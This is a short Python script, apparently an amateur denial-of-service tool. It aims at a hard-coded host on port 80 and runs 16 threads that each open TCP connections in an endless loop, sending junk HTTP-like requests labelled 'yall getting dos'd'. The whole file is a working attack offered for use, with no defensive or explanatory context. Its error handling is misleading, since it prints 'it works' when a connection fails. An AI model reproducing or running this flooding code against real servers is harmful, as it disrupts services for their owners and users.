import socket
from threading import Thread

host = "192.168.0.1" # ip to attack
ip = socket.gethostbyname(host) # for pages, translates to ip
port = 80 # port where packets get sent, 80 is web traffic, safest bet


def send_packets():
    while True:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            my_socket.connect((ip, port)) # connect to given host
            my_socket.send(str.encode("GET" + "yall getting dos'd" + "HTTP/1.1 \r\n")) # send some trash data
            my_socket.sendto(str.encode("GET" + "yall getting dos'd" + "HTTP/1.1 \r\n"), (ip, port))
        except socket.error:
            print("it works")
        my_socket.close()


def dos(threads=4):
    for i in range(threads):
        t = Thread(target=send_packets)
        t.start()
        print(t.name)


dos(16)
